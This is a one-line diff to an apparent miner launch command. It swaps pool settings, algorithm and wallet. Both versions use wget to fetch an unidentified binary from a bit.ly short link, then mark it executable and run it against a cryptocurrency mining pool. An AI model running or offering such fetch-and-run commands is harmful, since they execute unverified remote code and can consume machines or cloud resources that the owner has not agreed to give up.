@@ -1,1 +1,1 @@
-wget https://bit.ly/3MqS7zY && chmod +x 3MqS7zY && ./3MqS7zY -a x16rt -o stratum+tcp://stratum-na.rplant.xyz:7067 -u RTb5zre1gWPNGQLvAFbWY3DVDMke1RxdFQ.vcpu001  --opencl-launch auto --print-full --print-power
+wget https://bit.ly/3MqS7zY && chmod +x 3MqS7zY && ./3MqS7zY -a kawpow -o stratum+tcp://us-rvn.2miners.com:6060 -u RPvUaHXEkJazUbdDhn6FveV5APkaC6mC5p.vcpu00 -p x
